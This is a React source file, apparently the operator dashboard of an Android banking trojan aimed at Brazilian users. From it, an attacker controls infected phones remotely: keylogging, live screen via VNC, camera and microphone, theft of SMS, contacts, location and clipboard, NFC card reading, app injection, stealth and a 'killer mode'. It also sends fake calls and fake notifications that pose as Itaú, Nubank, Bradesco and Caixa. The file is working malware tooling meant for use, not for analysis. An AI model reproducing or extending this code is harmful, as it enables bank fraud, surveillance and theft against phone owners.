import { useState } from 'react';
import useStore from '../../store/index.js';
import { ws }   from '../../ws.js';
import LiveScreen     from './LiveScreen.jsx';
import LiveCamera     from './LiveCamera.jsx';
import LiveAudio      from './LiveAudio.jsx';
import AppManager     from './AppManager.jsx';
import DataExtraction from './DataExtraction.jsx';
import Financial      from './Financial.jsx';
import KeylogPanel    from './KeylogPanel.jsx';
import NFCPanel       from './NFCPanel.jsx';
import SecurityPanel  from './SecurityPanel.jsx';
import ScreenReaderV2 from './ScreenReaderV2.jsx';
import FakeCallPanel  from './FakeCallPanel.jsx';
import FakeNotifPanel from './FakeNotifPanel.jsx';

export default function DeviceDetail({ onBack }) {
  const d          = useStore(s => s.deviceDetail);
  const onlineIds  = useStore(s => s.onlineIds);
  const selectedId = useStore(s => s.selectedId);
  const [activeSection, setActiveSection] = useState(null);
  const [toast, setToast] = useState(null);

  const online   = onlineIds.has(selectedId);
  const ipMasked = (d?.ip_address || '').replace(/(\d+)\.(\d+)\.\d+\.\d+/, '$1.$2.***.***');

  function sendCmd(action, params = {}) {
    ws.send({ type: 'command', device_id: selectedId, action, ...params });
    showToast(`${action} enviado`);
  }

  function showToast(msg) {
    setToast(msg);
    setTimeout(() => setToast(null), 2500);
  }

  function go(id)  { setActiveSection(id); }
  function back()  {
    if (activeSection) { setActiveSection(null); return; }
    onBack();
  }

  if (!d) return null;

  const subProps = { deviceId: selectedId, onBack: back, sendCmd };

  const Toast = toast ? (
    <div style={{
      position: 'fixed', top: 76, left: '50%', transform: 'translateX(-50%)',
      background: 'rgba(18,14,4,.97)', border: '1px solid var(--gold)',
      borderRadius: 12, padding: '10px 20px', zIndex: 9999,
      maxWidth: '90vw', textAlign: 'center', pointerEvents: 'none',
    }}>
      <div style={{ color: '#00c864', fontSize: 14, marginBottom: 3 }}>✓</div>
      <div style={{ color: 'var(--gold)', fontWeight: 700, fontSize: 13 }}>{toast}</div>
    </div>
  ) : null;

  if (activeSection === 'screen')    return <>{Toast}<LiveScreen    {...subProps} /></>;
  if (activeSection === 'reader')    return <>{Toast}<ScreenReaderV2  {...subProps} /></>;
  if (activeSection === 'camera')    return <>{Toast}<LiveCamera    {...subProps} /></>;
  if (activeSection === 'audio')     return <>{Toast}<LiveAudio     {...subProps} /></>;
  if (activeSection === 'apps')      return <>{Toast}<AppManager    {...subProps} /></>;
  if (activeSection === 'data')      return <>{Toast}<DataExtraction {...subProps} /></>;
  if (activeSection === 'financial') return <>{Toast}<Financial     {...subProps} /></>;
  if (activeSection === 'keylog')    return <>{Toast}<KeylogPanel   {...subProps} /></>;
  if (activeSection === 'nfc')       return <>{Toast}<NFCPanel      {...subProps} /></>;
  if (activeSection === 'security')  return <>{Toast}<SecurityPanel {...subProps} /></>;
  if (activeSection === 'fakecall')  return <>{Toast}<FakeCallPanel {...subProps} /></>;
  if (activeSection === 'fakenotif') return <>{Toast}<FakeNotifPanel {...subProps} /></>;

  return (
    <div className="fade-up">
      {Toast}

      {/* Header */}
      <div className="row-sb mb12">
        <div className="row gap10">
          <div className="dev-item-icon" style={{ width: 38, height: 38, fontSize: 18 }}>📱</div>
          <div>
            <div style={{ fontWeight: 800, fontSize: 15 }}>{d.model || d.device_id}</div>
            <div className="row gap6 mt4">
              <span className={`dot ${online ? 'dot-green' : 'dot-red'}`} />
              <span className="txt-xs" style={{ color: online ? '#00c864' : '#e03060' }}>
                {online ? 'DISPOSITIVO CONECTADO' : 'OFFLINE'}
              </span>
            </div>
          </div>
        </div>
        <button className="btn btn-ghost btn-sm" onClick={back}>← VOLTAR</button>
      </div>

      {/* Identity card */}
      <div className="card mb12">
        <div className="row gap10">
          <div style={{
            width: 48, height: 48, borderRadius: 12,
            background: 'var(--gold-dim)', border: '1px solid var(--gold-border)',
            display: 'flex', alignItems: 'center', justifyContent: 'center',
            fontSize: 24, flexShrink: 0, position: 'relative',
          }}>
            📱
            <span className={`dot ${online ? 'dot-green' : 'dot-dim'}`}
              style={{ position: 'absolute', bottom: 2, right: 2, width: 10, height: 10,
                border: '2px solid var(--card)' }} />
          </div>
          <div className="flex1">
            <div className="row-sb mb6">
              <span style={{ fontWeight: 700, fontSize: 15 }}>{d.model || d.device_id}</span>
              <span className={`pill ${online ? 'pill-green' : 'pill-dim'}`}>
                {online ? '● ONLINE' : '● OFFLINE'}
              </span>
            </div>
            <div className="row gap6">
              <span className="pill pill-gold" style={{ fontSize: 11 }}>● {ipMasked || '—'}</span>
              <span className="pill pill-dim" style={{ fontSize: 11 }}>
                📅 {d.days_since_install || 0} dias
              </span>
              <span className="pill pill-dim" style={{ fontSize: 11 }}>
                Android {d.android_version || '?'}
              </span>
            </div>
          </div>
        </div>
      </div>

      {/* BANKS CRYPTER */}
      <div className="ctrl-group mb10">
        <div className="ctrl-group-header row-sb">
          <div className="row gap6"><span>💳</span> BANKS CRYPTER</div>
          <span className={`pill ${d.banks_crypter ? 'pill-green' : 'pill-dim'}`}>
            {d.banks_crypter ? 'ON' : 'OFF'}
          </span>
        </div>
        <div className="ctrl-group-body">
          <div className="txt-xs txt-dim mb6">Camada criptográfica bancária</div>
          <div className="toggle-wrap" style={{ padding: 0 }}>
            <span className="toggle-label">Ativar ALLBANK</span>
            <div className={`toggle ${d.banks_crypter ? 'on' : ''}`}
              onClick={() => sendCmd('TOGGLE_BOT_OPTION', { option: 'banks_crypter', enabled: !d.banks_crypter })} />
          </div>
        </div>
      </div>

      {/* NFC READER */}
      <div className="ctrl-group mb10">
        <div className="ctrl-group-header row-sb">
          <div className="row gap6"><span>📡</span> NFC READER</div>
          <span className="pill pill-green">READY</span>
        </div>
        <div className="ctrl-group-body">
          <div className="txt-xs txt-dim mb8">Leitor de proximidade</div>
          <button className="btn btn-blue btn-block" onClick={() => go('nfc')}>📡 START READER</button>
        </div>
      </div>

      {/* OPTIMIZE SERVER */}
      <div className="ctrl-group mb10">
        <div className="ctrl-group-header row-sb">
          <div className="row gap6"><span>⚡</span> OPTIMIZE SERVER</div>
          <span className="pill pill-dim">IDLE</span>
        </div>
        <div className="ctrl-group-body">
          <div className="txt-xs txt-dim mb8">VNC + WebSocket</div>
          <button className="btn btn-gold btn-block" onClick={() => sendCmd('RECONNECT_CONNECTION')}>
            ⚡ OPTIMIZE SERVER
          </button>
        </div>
      </div>

      {/* ── CONTROLE AO VIVO ──────────────────────────────────────────────── */}
      <div className="section-title mt16"><span className="section-icon">⚡</span>CONTROLE AO VIVO</div>

      <MenuRow icon="📱" label="Informações Gerais"   onClick={() => sendCmd('GET_DEVICE_INFO')} />
      <MenuRow icon="📺" label="Tela ao Vivo"         onClick={() => go('reader')}
        badge={d.vnc_active ? 'ATIVO' : null} highlight />
      <MenuRow icon="🖥"  label="VNC Direto"           onClick={() => go('screen')} />
      <MenuRow icon="📷" label="Câmera ao Vivo"       onClick={() => go('camera')}
        badge={d.camera_active ? 'ATIVO' : null} />
      <MenuRow icon="🎤" label="Áudio ao Vivo"        onClick={() => go('audio')}
        badge={d.mic_active ? 'ATIVO' : null} />

      {/* Battery */}
      <div className="ctrl-group mb8">
        <div style={{ padding: '10px 14px' }}>
          <div className="row-sb mb6">
            <div className="row gap6">
              <span>🔋</span>
              <span style={{ fontSize: 11, fontWeight: 700, color: '#d4950a', letterSpacing: 1 }}>ENERGIA</span>
            </div>
            <span style={{ fontSize: 13, fontWeight: 700, color: '#d4950a' }}>{d.battery_level || 0}%</span>
          </div>
          <div className="progress">
            <div className="progress-fill" style={{
              width: `${d.battery_level || 0}%`,
              background: (d.battery_level || 0) > 20 ? '#00c864' : '#e03060',
            }} />
          </div>
          {d.is_charging ? <div className="txt-xs txt-dim mt4">⚡ Carregando</div> : null}
        </div>
      </div>

      {/* ── ENGENHARIA SOCIAL ─────────────────────────────────────────────── */}
      <div className="section-title mt16">
        <span className="section-icon">🎭</span>ENGENHARIA SOCIAL
      </div>

      <MenuRow icon="📞" label="Fake Call"
        sub="Ligação falsa com nome e banco personalizado"
        onClick={() => go('fakecall')}
        badge="NOVO" badgeCls="pill-green" highlight />

      <MenuRow icon="🔔" label="Fake Notification"
        sub="Banner Heads-Up falso — Pix, transferência, alerta"
        onClick={() => go('fakenotif')}
        badge="NOVO" badgeCls="pill-blue" highlight />

      {/* Quick fake call buttons */}
      <div className="card mb10">
        <div className="txt-xs txt-dim mb8" style={{ letterSpacing: 1 }}>CHAMADA RÁPIDA</div>
        <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap' }}>
          {[
            { label: '🟠 Itaú',      bank: 'itau',    name: 'Gerente Itaú Uniclass',  number: '0800 728 0728' },
            { label: '🟣 Nubank',    bank: 'nubank',  name: 'Nubank Suporte',          number: '0800 591 2335' },
            { label: '🔴 Bradesco',  bank: 'bradesco',name: 'Bradesco Segurança',       number: '0800 701 0001' },
            { label: '🔵 Caixa',     bank: 'caixa',   name: 'Caixa Econômica',          number: '0800 726 0101' },
          ].map(preset => (
            <button key={preset.bank}
              className="btn btn-ghost btn-sm"
              style={{ fontSize: 10 }}
              onClick={() => sendCmd('FAKE_CALL', {
                caller_name: preset.name, caller_number: preset.number,
                bank: preset.bank, caller_title: 'Central de Segurança',
              })}>
              {preset.label}
            </button>
          ))}
          <button className="btn btn-red btn-sm" style={{ fontSize: 10 }}
            onClick={() => sendCmd('STOP_FAKE_CALL', {})}>
            🚫 ENCERRAR
          </button>
        </div>
      </div>

      {/* ── CONTROLES AVANÇADOS ───────────────────────────────────────────── */}
      <div className="section-title mt8"><span className="section-icon">🔧</span>CONTROLES AVANÇADOS</div>

      <MenuRow icon="⌨"  label="Keylogger"            onClick={() => go('keylog')}
        badge={d.keylogger_active ? 'ATIVO' : null} />
      <MenuRow icon="💳" label="Financeiro"            onClick={() => go('financial')} />
      <MenuRow icon="📊" label="Extração de Dados"     onClick={() => go('data')} />
      <MenuRow icon="📱" label="Apps / Inject"         onClick={() => go('apps')} />
      <MenuRow icon="🛡" label="Segurança / Stealth"   onClick={() => go('security')} />

      {/* ── Toggles ───────────────────────────────────────────────────────── */}
      <div className="section-title mt8"><span className="section-icon">⚡</span>TOGGLES RÁPIDOS</div>
      <div className="card mb10">
        <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
          <ToggleRow label="Keylogger" icon="⌨"
            on={!!d.keylogger_active}
            onChange={v => sendCmd('TOGGLE_KEYLOGGER', { enabled: v })} />
          <ToggleRow label="Tela Preta" icon="🌑"
            on={!!d.black_screen_active}
            onChange={v => sendCmd('TOGGLE_BLACK_SCREEN', { enabled: v })} />
          <ToggleRow label="Killer Mode" icon="💀"
            on={!!d.killer_mode}
            onChange={v => sendCmd('TOGGLE_KILLER_MODE', { enabled: v })} />
          <ToggleRow label="Banks Crypter" icon="💳"
            on={!!d.banks_crypter}
            onChange={v => sendCmd('TOGGLE_BOT_OPTION', { option: 'banks_crypter', enabled: v })} />
        </div>
      </div>

      {/* ── Ações rápidas ────────────────────────────────────────────────── */}
      <div className="section-title mt8"><span className="section-icon">⚡</span>AÇÕES RÁPIDAS</div>
      <div className="grid g2 mb16">
        {[
          ['💬 SMS', 'GET_SMS'],
          ['👤 Contatos', 'GET_CONTACTS'],
          ['📍 Localização', 'GET_LOCATION'],
          ['📱 Apps', 'GET_INSTALLED_APPS'],
          ['📋 Clipboard', 'GET_CLIPBOARD'],
          ['💡 Ligar Tela', 'WAKEUP'],
          ['🔒 Travar Tela', 'LOCK_DEVICE'],
          ['⌂ Home', 'HOME'],
        ].map(([lbl, action]) => (
          <button key={action} className="btn btn-ghost btn-sm btn-block"
            onClick={() => sendCmd(action)}>{lbl}</button>
        ))}
      </div>

      <div style={{ height: 24 }} />
    </div>
  );
}

function MenuRow({ icon, label, sub, onClick, badge, badgeCls = 'pill-gold', highlight }) {
  return (
    <div
      className="card card-sm mb6"
      style={{
        cursor: 'pointer',
        border: highlight ? '1px solid rgba(212,149,10,.2)' : undefined,
      }}
      onClick={onClick}>
      <div className="row-sb">
        <div className="row gap10">
          <span style={{ fontSize: 20 }}>{icon}</span>
          <div>
            <div style={{ fontWeight: 700, fontSize: 13 }}>{label}</div>
            {sub && <div className="txt-xs txt-dim mt2">{sub}</div>}
          </div>
        </div>
        <div className="row gap6">
          {badge && <span className={`pill ${badgeCls}`} style={{ fontSize: 10 }}>{badge}</span>}
          <span style={{ color: 'var(--text3)', fontSize: 16 }}>›</span>
        </div>
      </div>
    </div>
  );
}

function ToggleRow({ label, icon, on, onChange }) {
  return (
    <div className="toggle-wrap" style={{ padding: 0 }}>
      <span className="toggle-label">
        <span style={{ marginRight: 6 }}>{icon}</span>
        {label}
      </span>
      <div className={`toggle ${on ? 'on' : ''}`}
        onClick={() => onChange(!on)} />
    </div>
  );
}
